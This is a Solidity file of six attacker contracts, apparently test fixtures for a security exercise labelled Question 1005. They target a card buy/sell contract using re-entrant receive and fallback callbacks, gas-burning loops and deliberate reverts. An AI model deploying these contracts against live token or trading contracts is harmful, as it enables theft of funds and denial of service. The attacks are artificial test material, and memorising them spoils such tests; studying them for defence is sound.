// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
interface toAttack {
    function buyCards(
        address cardsSubject,
        uint256 amount
    ) external payable;
    function sellCards(
        address cardsSubject,
        uint256 amount
    ) external payable;
    function getBuyPriceAfterFee(
        address cardsSubject,
        uint256 amount
    ) external view returns (uint256) ;
}

contract Question1005Attacker1 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        toAttack(target).buyCards{value: msg.value}(address(this), 2);
    }

    receive() payable external{
        uint res;
        for(uint i =0 ; i< 100; i++){
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable{

    }
}

contract Question1005Attacker2 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        toAttack(target).buyCards{value: msg.value/2}(address(this), 2);
        toAttack(target).sellCards(address(this), 1);
    }

    receive() payable external{
        uint res;
        for(uint i =0 ; i< 100; i++){
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable{

    }
}
contract Question1005Attacker3 {
    address public target;

    constructor(address _target){
        target = _target;
    }

    function attack() external payable{
        toAttack(target).buyCards{value: msg.value}(address(this), 2);
    }

    fallback() external{
        revert("aaa");
    }
}
contract Question1005Attacker4 {
    address public target;

    uint private _stack;
    constructor(address _target){
        target = _target;
    }

    function attack() public payable{
        toAttack(target).sellCards(address(this), 1);
    }

    function buy() public payable {
        toAttack(target).buyCards{value: msg.value}(address(this), 2);
    }
    fallback() external{
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            revert("aaa");
        }
    }
}

contract Question1005Attacker5 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        toAttack(target).buyCards{value: msg.value}(address(this), 2);
    }

    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            _stack = 0;
        }
    }

    fallback() external payable {}
}

contract Question1005Attacker6 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        uint val = toAttack(target).getBuyPriceAfterFee(address(this), 3);
        toAttack(target).buyCards{value: val}(address(this), 3);
        toAttack(target).sellCards(address(this), 1);
    }

    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
        } else {
            attack();
            _stack = 0;
        }
    }

    fallback() external payable {}
}